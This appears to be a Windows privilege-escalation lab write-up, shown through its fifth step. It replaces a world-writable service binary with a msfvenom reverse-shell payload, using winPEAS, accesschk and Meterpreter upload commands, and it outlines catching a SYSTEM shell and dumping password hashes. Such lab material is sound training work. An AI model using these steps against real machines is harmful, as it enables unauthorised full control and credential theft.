# File Permission Service

**Date:** June 2026
**Author:** ShahinSecLab
**Category:** Privilege Escalation
**Difficulty:** Easy
**Tools:** msfvenom, Metasploit, winPEAS, accesschk.exe

## Table of Contents

- [Introduction](#introduction)
- [Why This Attack Works](#why-this-attack-works)
- [Lab Setup](#lab-setup)
- [What I Needed Before Starting](#what-i-needed-before-starting)
- [What I Understood During the Process](#what-i-understood-during-the-process)
- [Attack Flow](#attack-flow)
- [Step 1 — Running winPEAS to Find the Vulnerable Service](#step-1--running-winpeas-to-find-the-vulnerable-service)
- [Step 2 — Checking the Service Configuration](#step-2--checking-the-service-configuration)
- [Step 3 — Checking Binary File Permissions with accesschkexe](#step-3--checking-binary-file-permissions-with-accesschkexe)
- [Step 4 — Backing Up the Original Service Binary](#step-4--backing-up-the-original-service-binary)
- [Step 5 — Uploading the Payload and Replacing the Service Binary](#step-5--uploading-the-payload-and-replacing-the-service-binary)
- [Step 6 — Getting a SYSTEM Shell and Dumping Hashes](#step-6--getting-a-system-shell-and-dumping-hashes)
- [How Defenders Can Catch This](#how-defenders-can-catch-this)
- [How to Prevent It](#how-to-prevent-it)
- [What I Achieved](#what-i-achieved)

## Introduction

File Permission Service is a local privilege escalation technique. The idea is simple — when a Windows service binary has weak file permissions, a low privilege user can replace the real binary with a malicious one. When the service starts, it runs the malicious binary as SYSTEM — giving full control of the machine without needing any exploit or CVE.

## Why This Attack Works

Windows services often run as SYSTEM. If the actual binary file that the service runs has weak permissions — meaning normal users can overwrite it — I can swap it out with my own payload. The next time the service starts, Windows runs my file thinking it is the real one, and I get a SYSTEM shell.

## Lab Setup

```
|   Component      |         Details          |
|------------------|--------------------------|
| Attacker Machine | Kali Linux               |
| Attacker IP      | `192.168.5.128`          |
| Victim Machine   | Windows 10 (MSEDGEWIN10) |
| Victim IP        | `192.168.5.144`          |
| Network          | VMware Host-Only Network |
| Domain           | WORKGROUP                |
```

## Tools Prepared on Kali Before Starting

```
|        Tool      |          Location         |         Purpose                            |
|------------------|---------------------------|--------------------------------------------|
| winPEASany.exe   | /home/kali/Desktop/tools/ | Find privilege escalation paths.           |
| accesschk.exe    | /home/kali/Desktop/tools/ | Check file and service permissions.        |
| rev.exe          | /home/kali/Desktop/       | Malicious payload generated with `msfvenom`|
| Metasploit       | Built into Kali           | Catch reverse shells.                      |
```

## What I Needed Before Starting

```
|         What                      |                          Why                            |
|-----------------------------------|---------------------------------------------------------|
| Low-privilege shell on the victim | Starting point for the privilege escalation attack.     |
| winPEAS                           | To identify services with weak binary file permissions. |
| accesschk.exe                     | To verify the permissions on the service executable.    |
| msfvenom                          | To generate the malicious payload.                      |
| Metasploit                        | To receive the reverse Meterpreter session.             |
```

## What I Understood During the Process

While working through this attack I realized that:

- Weak file permissions on a service binary are just as dangerous as weak service config permissions
- If Everyone or BUILTIN\Users has FILE_ALL_ACCESS on a service binary — that machine is wide open
- Backing up the original binary before replacing it is important so the service does not break permanently
- Once you have a SYSTEM Meterpreter session, you can dump all password hashes from the machine in one command
- This kind of misconfiguration is very easy to miss during system setup

## Attack Flow

```
Already had a low privilege Meterpreter shell on the victim
                        ↓
Ran winPEAS — flagged filepermsvc with weak file permissions
                        ↓
Checked service config — runs as LocalSystem (SYSTEM)
                        ↓
Checked file permissions with accesschk.exe
                        ↓
Found FILE_ALL_ACCESS for Everyone and BUILTIN\Users on the binary
                        ↓
Backed up original binary to C:\temp
                        ↓
Uploaded malicious rev.exe from Kali to victim
                        ↓
Replaced filepermservice.exe with rev.exe
                        ↓
Started Metasploit listener on port 4444
                        ↓
Started filepermsvc service
                        ↓
Metasploit caught the shell
                        ↓
whoami → nt authority\system
                        ↓
Ran hashdump — dumped all password hashes from the machine
```


## Step 1 — Running winPEAS to Find the Vulnerable Service

I already had a low-privilege Meterpreter shell on the target machine. I ran winPEAS to scan for privilege escalation paths.


```bash
C:\PrivEsc> .\winPEASany.exe
```
winPEAS flagged filepermsvc straight away — it showed the service binary had FILE_ALL_ACCESS for Everyone. That was my target.S

**Output:**

```
filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]
```
<p align="center">
  <img src="images/step1-1.png" width="600">
</p>

## Step 2 — Checking the Service Configuration

After finding the vulnerable service with **winPEAS**, I checked its configuration to see how it was set up.

```bash
C:\PrivEsc> sc qc filepermsvc
```
**Output:**

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
The output showed that the service runs as **LocalSystem**, which means it starts with **SYSTEM** privileges. It also showed the full path to the service executable, which I would need in the next step.

<p align="center">
  <img src="images/step2-1.png" width="600">
</p>

## Step 3 — Checking Binary File Permissions with accesschk.exe

To make sure I could replace the service executable, I checked its file permissions using **accesschk.exe**.

```bash
.\accesschk.exe /accepteula -uwqv "C:\Program Files\File Permissions Service\filepermservice.exe"
```
**Output:**

```
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```
- `RW Everyone — FILE_ALL_ACCESSE`: very single user on the machine can replace this file
- `RW BUILTIN\Users — FILE_ALL_ACCESS`: Normal users have full control over the binary

`FILE_ALL_ACCESS` for `Everyone` confirmed I could replace the real binary with my own payload.

<p align="center">
  <img src="images/step3-1.png" width="600">
</p>

## Step 4 — Backing Up the Original Service Binary

Before replacing the real binary, I backed it up to `C:\temp` so I could restore it afterwards.

```bash
copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\temp
```
**Output:**

```
1 file(s) copied.
```
<p align="center">
  <img src="images/step4-1.png" width="600">
</p>

## Step 5 — Uploading the Payload and Replacing the Service Binary

### Uploaded rev.exe from Kali

I alreay had a payload named `rev.exe` created by msfvenom. From kali, I uploaded this file on victim machine.

```bash
meterpreter > upload /home/kali/Desktop/rev.exe
```
```
[*] Uploading  : /home/kali/Desktop/rev.exe -> rev.exe
[*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/kali/Desktop/rev.exe -> rev.exe
[*] Completed  : /home/kali/Desktop/rev.exe -> rev.exe
```
<p align="center">
  <img src="images/step5-1.png" width="600">
</p>